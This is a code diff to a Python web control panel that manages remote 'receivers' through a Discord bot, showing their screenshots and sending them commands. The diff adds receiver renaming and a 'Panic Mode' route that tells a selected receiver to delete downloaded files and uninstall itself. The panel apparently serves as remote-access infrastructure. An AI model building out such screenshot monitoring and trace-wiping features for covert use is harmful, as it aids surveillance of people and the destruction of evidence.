@@ -48,7 +48,7 @@ assert TARGET_CHANNEL_ID
 ROOT_DIR = Path(__file__).parent
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
 STATE_FILE = ROOT_DIR / "receivers.json"
-_receivers: dict[str, dict] = {}  # id -> {"name": str, "last_seen": float, "tag": str}
+_receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str}
 _selected_receiver: Optional[str] = None
 STALE_SECONDS = 90
 
@@ -126,8 +126,8 @@ async def on_message(message: discord.Message):
             receiver_id = tokens[1].strip()
             tag = tokens[2].strip()
             now = time.time()
-            entry = _receivers.get(receiver_id, {"name": tag, "tag": tag, "last_seen": now})
-            entry["name"] = tag
+            entry = _receivers.get(receiver_id, {"alias": "", "tag": tag, "last_seen": now})
+            entry.setdefault("alias", "")
             entry["tag"] = tag
             entry["last_seen"] = now
             _receivers[receiver_id] = entry
@@ -193,6 +193,10 @@ CONTROL_HTML = """<!doctype html>
     .tab-btn.active { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #0b0419; border-color: transparent; }
     .tab-pane { display: none; }
     .tab-pane.active { display: block; }
+    .receiver-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+    .rename-input { width: 180px; min-width: 140px; margin-bottom: 0; }
+    .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #f97316, var(--danger)); color: #0b0419; box-shadow: 0 12px 24px rgba(239,68,68,0.35); }
+    .panic-btn:active { transform: translateY(1px); }
   </style>
 </head>
 <body>
@@ -258,28 +262,57 @@ CONTROL_HTML = """<!doctype html>
       </div>
     </div>
   </div>
+  <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
   <script>
+    let selectedReceiver = null;
     async function refreshReceivers() {
       try {
         const res = await fetch('/api/receivers');
         if (!res.ok) return;
         const data = await res.json();
+        selectedReceiver = data.selected || null;
         const wrap = document.getElementById('receiver-buttons');
         wrap.innerHTML = '';
         (data.online || []).forEach(rec => {
-          const form = document.createElement('form');
-          form.method = 'post';
-          form.action = '/ui/select/' + encodeURIComponent(rec.id);
+          const row = document.createElement('div');
+          row.className = 'receiver-row';
+
+          const selectForm = document.createElement('form');
+          selectForm.method = 'post';
+          selectForm.action = '/ui/select/' + encodeURIComponent(rec.id);
           const btn = document.createElement('button');
           btn.type = 'submit';
-          btn.textContent = rec.tag;
+          btn.textContent = rec.name || rec.tag || rec.id;
           if (data.selected === rec.id) {
             btn.style.background = '#10b981';
             btn.style.color = '#0b1224';
           }
-          form.appendChild(btn);
-          wrap.appendChild(form);
+          selectForm.appendChild(btn);
+
+          const renameForm = document.createElement('form');
+          renameForm.method = 'post';
+          renameForm.action = '/ui/rename/' + encodeURIComponent(rec.id);
+          const input = document.createElement('input');
+          input.type = 'text';
+          input.name = 'alias';
+          input.placeholder = 'Rename';
+          input.value = rec.alias || '';
+          input.className = 'rename-input';
+          const renameBtn = document.createElement('button');
+          renameBtn.type = 'submit';
+          renameBtn.textContent = 'Rename';
+          renameBtn.className = 'secondary';
+          renameForm.appendChild(input);
+          renameForm.appendChild(renameBtn);
+
+          row.appendChild(selectForm);
+          row.appendChild(renameForm);
+          wrap.appendChild(row);
         });
+        const panicBtn = document.getElementById('panic-btn');
+        if (panicBtn) {
+          panicBtn.disabled = !selectedReceiver;
+        }
       } catch (e) { /* ignore */ }
     }
     async function refreshScreen() {
@@ -307,6 +340,28 @@ CONTROL_HTML = """<!doctype html>
     refreshScreen();
     setInterval(refreshReceivers, 5000);
     setInterval(refreshScreen, 4000);
+
+    const panicBtn = document.getElementById('panic-btn');
+    if (panicBtn) {
+      panicBtn.addEventListener('click', async () => {
+        if (!selectedReceiver) {
+          alert('Select a receiver first.');
+          return;
+        }
+        const ok = confirm('Panic mode will delete downloaded files and remove the receiver app. Continue?');
+        if (!ok) return;
+        try {
+          const res = await fetch('/ui/panic', { method: 'POST' });
+          if (!res.ok) {
+            alert('Panic request failed.');
+            return;
+          }
+          window.location.reload();
+        } catch (e) {
+          alert('Panic request failed.');
+        }
+      });
+    }
   </script>
 </body>
 </html>"""
@@ -406,7 +461,15 @@ async def api_receivers():
     _prune_receivers(now)
     online = []
     for rid, info in _receivers.items():
-        data = {"id": rid, "name": info.get("tag"), "tag": info.get("tag"), "last_seen": info.get("last_seen", 0)}
+        alias = info.get("alias") or ""
+        display = alias or info.get("tag") or rid
+        data = {
+            "id": rid,
+            "name": display,
+            "tag": info.get("tag"),
+            "alias": alias,
+            "last_seen": info.get("last_seen", 0),
+        }
         online.append(data)
     return JSONResponse({"online": online, "offline": [], "selected": _selected_receiver})
 
@@ -497,6 +560,33 @@ async def ui_volume(request: Request):
         if not await _wait_controller_ready():
             return HTMLResponse("Discord bot not ready", status_code=503)
         await _send_cmd(msg)
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/rename/{rid}")
+async def ui_rename(rid: str, request: Request):
+    alias = None
+    try:
+        form = await request.form()
+        alias = form.get("alias")
+    except Exception:
+        alias = request.query_params.get("alias")
+    _prune_receivers()
+    if rid in _receivers and alias is not None:
+        cleaned = alias.strip()
+        if cleaned:
+            _receivers[rid]["alias"] = cleaned
+        else:
+            _receivers[rid].pop("alias", None)
+        _save_state()
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/panic")
+async def ui_panic():
+    if not _selected_receiver:
+        return HTMLResponse("No receiver selected", status_code=400)
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("PANIC"))
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/select/{tag}")
